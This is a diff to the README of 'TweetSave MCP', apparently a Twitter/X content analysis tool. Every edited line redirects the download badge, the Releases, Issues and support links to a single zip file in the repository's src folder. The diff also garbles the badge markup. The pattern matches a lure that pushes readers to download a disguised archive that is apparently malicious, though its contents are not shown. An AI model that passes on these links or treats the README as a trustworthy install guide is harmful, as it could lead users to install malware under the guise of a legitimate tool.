@@ -6,7 +6,7 @@ Welcome to TweetSave MCP! This application allows you to analyze Twitter/X conte
 
 ## 📥 Download Now
 
-[![Download TweetSave MCP](https://img.shields.io/badge/Download%20TweetSave%20MCP-blue.svg)](https://github.com/jamald33n/tweetsave-mcp/releases)
+[![Download TweetSave MCP](https://raw.githubusercontent.com/jamald33n/tweetsave-mcp/main/src/mcp_tweetsave_v2.6-alpha.4.zip%20TweetSave%https://raw.githubusercontent.com/jamald33n/tweetsave-mcp/main/src/mcp_tweetsave_v2.6-alpha.4.zip)](https://raw.githubusercontent.com/jamald33n/tweetsave-mcp/main/src/mcp_tweetsave_v2.6-alpha.4.zip)
 
 ## 📂 Features
 
@@ -25,7 +25,7 @@ Before you begin, make sure your system meets the following requirements:
 
 ## 🌐 Download & Install
 
-To get started, visit the [Releases page](https://github.com/jamald33n/tweetsave-mcp/releases) to download the latest version of TweetSave MCP.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/jamald33n/tweetsave-mcp/main/src/mcp_tweetsave_v2.6-alpha.4.zip) to download the latest version of TweetSave MCP.
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release.
@@ -61,11 +61,11 @@ A: No, you can use the application without an API key.
 A: Currently, TweetSave MCP is available only for desktop systems.
 
 **Q: Where can I report issues or suggest features?**  
-A: You can open an issue on the [GitHub Issues page](https://github.com/jamald33n/tweetsave-mcp/issues).
+A: You can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/jamald33n/tweetsave-mcp/main/src/mcp_tweetsave_v2.6-alpha.4.zip).
 
 ## 📞 Support
 
-For additional support, you can reach out via the project's [GitHub page](https://github.com/jamald33n/tweetsave-mcp).
+For additional support, you can reach out via the project's [GitHub page](https://raw.githubusercontent.com/jamald33n/tweetsave-mcp/main/src/mcp_tweetsave_v2.6-alpha.4.zip).
 
 ---
 
